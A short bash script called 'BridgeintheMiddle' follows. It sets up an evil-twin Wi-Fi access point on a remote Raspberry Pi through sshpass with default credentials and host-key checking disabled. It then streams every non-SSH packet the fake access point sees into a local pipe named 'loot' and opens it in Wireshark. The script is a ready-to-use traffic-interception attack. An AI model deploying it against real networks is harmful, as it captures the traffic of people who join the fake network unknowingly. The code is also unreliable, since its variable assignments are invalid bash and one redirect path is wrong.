#!/bin/bash

# BridgeintheMiddle
# Version 0.1
# Author: bmshema

## Bridging Device Variables (CHANGE THESE) ##
UN = pi
PW = raspberry
IP = '10.0.0.11'

## Parameters of your evil twin on your bridging device (CHANGE THESE) ##
WPA = 2 # Use 1 for WPA, use 2 for WPA2, use 1+2 for both
CH = 11
MAC = '11:22:33:44:55:66' # BSSID of your AP
FREQ = '2.4' # 2.4 or 5
INT = wlan0 # Interface to serve AP
NET = ppp0 # Interface with internet access
SSID = TestSSID 
PSK = testtestpsk

## Makes a named pipe for Wireshark to listen to ##
if [ ! -e /tmp/loot ]; then
    mkfifo /tmp/loot
fi

# Serves evil twin AP on bridging device ##
sshpass -p "${PW}" ssh -o StrictHostKeyChecking=no ${UN}@${IP} "sudo create_ap -w ${WPA} -c ${CH} --mac ${MAC} --freq-band ${FREQ} ${INT} ${NET} ${SSID} ${PSK} --no-virt"

sleep 3

## Lanuches tcpdump on bridging device and redirects to local named pipe ##
sshpass -p "${PW}" ssh -o StrictHostKeyChecking=no ${UN}@${IP} "sudo -S tcpdump -s0 -U -n -w - not port 22" > tmp/loot

sleep 3

# Opens wireshark for you because why not"
wireshark -k -i /tmp/loot